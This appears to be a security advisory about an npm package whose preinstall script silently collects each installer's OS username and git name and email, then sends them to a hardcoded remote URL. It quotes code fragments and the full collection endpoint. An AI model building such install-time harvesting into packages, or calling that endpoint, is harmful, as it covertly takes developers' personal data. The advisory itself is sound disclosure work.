summary: preinstall script exfiltrates installer git identity and OS username to hardcoded remote endpoint
details: The package's `preinstall` lifecycle script (`dist/scripts/preinstall.js`) silently harvests installer-side PII on every `npm install`. Specifically: it calls `os.userInfo()` to read the OS username and parses `~/.gitconfig` via `iniparser.parseSync(home_dir+'/.gitconfig')` to extract `user.name` and `user.email`, then issues an unconditional HTTPS GET to `https://2tak.l.serverhost.name:1962/mobile/reext?osname=<USER>&gitname=<GIT_NAME>&gitemail=<GIT_EMAIL>`. Git config typically holds the developer's real name and work/personal email address; combined with the OS username, this is per-install identity collection transmitted to an author-controlled server without consent, documentation, or opt-out. The destination appears to be the author's own infrastructure (also referenced in README), but installer consent is absent — the README does not disclose this telemetry, and the harvested data is installer PII, not the author's. This matches the active-attack profile: lifecycle-hook exfiltration of installer data to a hardcoded network destination. Note that the apparent gating check `if (osname === 'xmarcgusmano')` does not gate the HTTP call — the exfil runs unconditionally.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
